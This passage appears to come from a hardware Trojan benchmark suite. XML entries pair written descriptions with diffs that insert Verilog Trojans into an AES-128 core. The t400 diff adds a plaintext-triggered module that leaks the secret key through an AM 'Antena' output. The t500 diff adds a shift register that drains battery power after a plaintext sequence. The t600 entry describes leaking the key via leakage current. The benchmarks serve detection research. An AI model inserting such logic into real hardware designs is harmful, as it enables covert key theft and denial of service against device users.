+		#300 $finish;
+	end
+	
+   always #10.015 clk = ~clk;
+	
+endmodule
+
diff -rupN aes/src/tjfree/am_transmission.v aes/src/tjin-t400/am_transmission.v
--- aes/src/tjfree/am_transmission.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t400/am_transmission.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,66 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    11:14:06 03/08/2013 
+// Design Name: 
+// Module Name:    AM_Transmission 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module AM_Transmission(
+    input [127:0] key,
+    input clk,
+    input rst,
+	 input Tj_Trig, 
+    output Antena
+    );
+
+	reg [25:0] Baud8GeneratorACC;
+	reg [127:0] SECRETKey;
+	reg [127:0] SHIFTReg;
+	
+	always @(posedge clk)
+	begin
+		if ((rst == 1&apos;b1) || (Tj_Trig == 1&apos;b1)) begin
+			Baud8GeneratorACC &lt;= 0;
+		end else begin
+			Baud8GeneratorACC &lt;= Baud8GeneratorACC + 1;
+		end
+	end
+	
+	always @(posedge Tj_Trig, posedge Baud8GeneratorACC[25])
+	begin
+		if (Tj_Trig == 1&apos;b1) begin
+			SHIFTReg &lt;= key;
+		end else begin	
+			SHIFTReg &lt;= SHIFTReg &gt;&gt; 1; 
+		end	
+	end
+
+//	always @(posedge rst, posedge Tj_Trig, posedge Baud8GeneratorACC[25])
+//	begin
+//		if ( (rst == 1&apos;b1) || (Tj_Trig == 1&apos;b1) ) begin
+//			SHIFTReg &lt;= key;
+//		end else begin	
+//			SHIFTReg &lt;= SHIFTReg &gt;&gt; 1; 
+//		end	
+//	end
+
+	assign beep1 = !(Baud8GeneratorACC[25] | Baud8GeneratorACC[24] | Baud8GeneratorACC[23]);
+	assign beep2 = !(Baud8GeneratorACC[25] | !(Baud8GeneratorACC[24]) | Baud8GeneratorACC[23]) &amp; SHIFTReg[0];
+	assign beeps = beep1 | beep2;
+	assign MUX_Sel = beeps &amp; Baud8GeneratorACC[15] &amp; Baud8GeneratorACC[4];
+	assign Antena = (MUX_Sel) ? !(rst): 1&apos;b0; 
+
+endmodule
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t400/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t400/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t400/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t400/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tb_am.v aes/src/tjin-t400/tb_am.v
--- aes/src/tjfree/tb_am.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t400/tb_am.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,66 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   11:50:53 03/08/2013
+// Design Name:   AM_Transmission
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/tb_AM.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: AM_Transmission
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tb_AM;
+
+	// Inputs
+	reg [127:0] key;
+	reg clk;
+	reg rst;
+	reg Tj_Trig;
+	
+	// Outputs
+	wire Antena;
+
+	// Instantiate the Unit Under Test (UUT)
+	AM_Transmission uut (
+		.key(key), 
+		.clk(clk), 
+		.rst(rst), 
+		.Tj_Trig(Tj_Trig),
+		.Antena(Antena)
+	);
+
+	initial begin
+		// Initialize Inputs
+		key = 0;
+		clk = 0;
+		rst = 0;
+		Tj_Trig = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;
+		Tj_Trig = 1;
+		key = 128&apos;hAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
+		// Add stimulus here
+		#25
+		Tj_Trig = 0;
+		rst = 0;
+		#300 $finish;
+	end
+	
+   always #10.015 clk = ~clk;
+endmodule
+
diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t400/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t400/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t400/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t400/top.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,33 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:55:51 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out, Antena);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+    output Antena;
+	 
+	 wire Tj_Trig;
+
+	aes_128 AES (clk, state, key, out);
+	Trojan_Trigger Tj_Trigger (rst, clk, state, Tj_Trig);
+	AM_Transmission TSC (key, clk, rst, Tj_Trig, Antena);
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t400/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t400/trojan_trigger.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,53 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input clk,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg tempClk1, tempClk2;
+	reg Detected;
+	
+	always @(tempClk1, tempClk2)
+	begin
+		Tj_Trig &lt;= tempClk1 | tempClk2;
+	end
+	
+	// Tj_Trig is high for two clock cycles
+	always @(posedge clk)
+	begin
+		if (rst == 1)	begin tempClk1 &lt;= 1; tempClk2 &lt;= 0; end
+		else if ((tempClk1 == 1) &amp;&amp; (Detected == 1))	begin tempClk1 &lt;= 0; tempClk2 &lt;= 1;	end
+		else if ((tempClk1 == 0) &amp;&amp; (tempClk2 == 1))	begin tempClk2 &lt;= 0;	end		
+		else begin tempClk1 &lt;= 0; tempClk2 &lt;= 0; end
+	end
+
+	always @(state)
+	begin
+		if (state == 128&apos;hFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)	
+			Detected &lt;= 1; 
+		else 
+			Detected &lt;= 0; 
+	end
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="ae127559-1846-40bc-b048-8388989f1970" name="t500" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	?At the core of lightweight applications, such as medical implant devices,are the batteries that power them and 
	the success of the device restsheavily on them. This Trojan drains the battery once it is activated. The Trojan 
	gets activated after observing a specific sequence of the input plain text. The Trojan payload is a shift register 
	which continuously rotates after Trojan activation. The Trojan increases the power consumption and hence decreases 
	the expected lifetime of the battery.



Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Denial of Service
 	Location: Processor
	Physical characteristics: Functional
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t500/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t500/aes_128.v	2015-08-21 12:09:52.721423309 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
@@ -22,7 +22,7 @@ module aes_128(clk, state, key, out);
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
                    k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
-
+
     always @ (posedge clk)
       begin
         s0 &lt;= state ^ key;
diff -rupN aes/src/tjfree/battery_tb.v aes/src/tjin-t500/battery_tb.v
--- aes/src/tjfree/battery_tb.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t500/battery_tb.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,101 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   18:44:19 03/08/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES4/AES_BatteryDepletion/battery_tb.v
+// Project Name:  AES_BatteryDepletion
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module battery_tb;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+
+	initial begin
+		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+
+		#50
+		rst = 1;
+		
+		#25
+		rst = 0;
+
+		#25
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+
+endmodule
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t500/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t500/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t500/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t500/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t500/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t500/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t500/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t500/top.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,29 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:35:35 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+
+		aes_128 AES (clk, state, key, out);
+		TSC Trojan (clk, rst, state);
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t500/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t500/tsc.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,62 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:18:26 03/08/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input clk,
+    input rst,
+    input [127:0] state
+    );
+
+	 reg 	[127:0] DynamicPower; 
+	 reg 	State0, State1, State2, State3; 
+	 reg 	Tj_Trig;
+	 
+	 always @(rst, clk)
+	 begin
+		if (rst == 1)
+			DynamicPower &lt;= 128&apos;haaaaaaaa_aaaaaaaa_aaaaaaaa_aaaaaaaa;
+		else if (Tj_Trig == 1)
+			DynamicPower &lt;= {DynamicPower[0],DynamicPower[127:1]}; 	
+	 end
+
+	 always @(rst, state)
+	 begin
+		if (rst == 1) begin
+			State0 &lt;= 0;
+			State1 &lt;= 0;
+			State2 &lt;= 0;
+			State3 &lt;= 0; 
+		end else if (state == 128&apos;h3243f6a8_885a308d_313198a2_e0370734) begin
+			State0 &lt;= 1;
+		end else if ((state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) &amp;&amp; (State0 == 1)) begin
+			State1 &lt;= 1;
+		end else if ((state == 128&apos;h0) &amp;&amp; (State1 == 1)) begin
+			State2 &lt;= 1;
+		end else if ((state == 128&apos;h1) &amp;&amp; (State2 == 1)) begin
+			State3 &lt;= 1;
+		end
+	 end
+
+	always @(State0, State1, State2, State3)
+	begin
+		Tj_Trig &lt;= State0 &amp; State1 &amp; State2 &amp; State3;
+	end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="7a83bafc-dedf-4335-83ab-056d1366b932" name="t600" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	After detecting a specific input plaintext, the Trojan leaks the secret key of AES-128 through the leakage current. 
	The leakage circuit (LC) consists of a shift register holding the secret key and two inverters. The least significant 
	bit of the shift register is connected to one inverter whose output connected to the input of the other inverter. 
	Whenever the least significant bit is '0', a direct path between power and ground composed by the PMOS of the first 
	inverter and the NMOS of the second inverter is created for a limited time. Therefore, the secret key can be retrieved 
	by measuring the leakage current.


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Leak Information
 	Location: Processor
	Physical characteristics: Functional
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t600/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t600/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
@@ -22,7 +22,7 @@ module aes_128(clk, state, key, out);
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
                    k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
-
+
     always @ (posedge clk)
       begin
         s0 &lt;= state ^ key;
diff -rupN aes/src/tjfree/one_round.v aes/src/tjin-t600/one_round.v
--- aes/src/tjfree/one_round.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t600/one_round.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,81 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-/* one AES round for every two clock cycles */
-module one_round (clk, state_in, key, state_out);
-    input              clk;
-    input      [127:0] state_in, key;
-    output reg [127:0] state_out;
-    wire       [31:0]  s0,  s1,  s2,  s3,
-                       z0,  z1,  z2,  z3,
-                       p00, p01, p02, p03,
-                       p10, p11, p12, p13,
-                       p20, p21, p22, p23,
-                       p30, p31, p32, p33,
-                       k0,  k1,  k2,  k3;
-
-    assign {k0, k1, k2, k3} = key;
-
-    assign {s0, s1, s2, s3} = state_in;
-
-    table_lookup
-        t0 (clk, s0, p00, p01, p02, p03),
-        t1 (clk, s1, p10, p11, p12, p13),
-        t2 (clk, s2, p20, p21, p22, p23),
-        t3 (clk, s3, p30, p31, p32, p33);
-
-    assign z0 = p00 ^ p11 ^ p22 ^ p33 ^ k0;
-    assign z1 = p03 ^ p10 ^ p21 ^ p32 ^ k1;
-    assign z2 = p02 ^ p13 ^ p20 ^ p31 ^ k2;
-    assign z3 = p01 ^ p12 ^ p23 ^ p30 ^ k3;
-
-    always @ (posedge clk)
-        state_out &lt;= {z0, z1, z2, z3};
-endmodule
-
-/* AES final round for every two clock cycles */
-module final_round (clk, state_in, key_in, state_out);
-    input              clk;
-    input      [127:0] state_in;
-    input      [127:0] key_in;
-    output reg [127:0] state_out;
-    wire [31:0] s0,  s1,  s2,  s3,
-                z0,  z1,  z2,  z3,
-                k0,  k1,  k2,  k3;
-    wire [7:0]  p00, p01, p02, p03,
-                p10, p11, p12, p13,
-                p20, p21, p22, p23,
-                p30, p31, p32, p33;
-    
-    assign {k0, k1, k2, k3} = key_in;
-    
-    assign {s0, s1, s2, s3} = state_in;
-
-    S4
-        S4_1 (clk, s0, {p00, p01, p02, p03}),
-        S4_2 (clk, s1, {p10, p11, p12, p13}),
-        S4_3 (clk, s2, {p20, p21, p22, p23}),
-        S4_4 (clk, s3, {p30, p31, p32, p33});
-
-    assign z0 = {p00, p11, p22, p33} ^ k0;
-    assign z1 = {p10, p21, p32, p03} ^ k1;
-    assign z2 = {p20, p31, p02, p13} ^ k2;
-    assign z3 = {p30, p01, p12, p23} ^ k3;
-
-    always @ (posedge clk)
-        state_out &lt;= {z0, z1, z2, z3};
-endmodule
-
diff -rupN aes/src/tjfree/read_me.txt aes/src/tjin-t600/read_me.txt
--- aes/src/tjfree/read_me.txt	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t600/read_me.txt	1970-01-01 01:00:00.000000000 +0100
@@ -1,12 +0,0 @@
-How to start the simulation
-
-1. simulation.do
-----------------
-This file is a batch file for Modelsim to compile the HDL files, setup the wave file, and begin function simulation. 
-The working directory of Modelsim must be the same directory of the batch file.
-
-2. test_aes_128.v
-----------------------
-This file is the main test bench. 
-It is self-checked. It feeds input data to the core and compare the correct result with the output of the core. 
-If the output is wrong, the test bench will display an error message.
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t600/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t600/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/table_lookup.v aes/src/tjin-t600/table_lookup.v
--- aes/src/tjfree/table_lookup.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t600/table_lookup.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,590 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
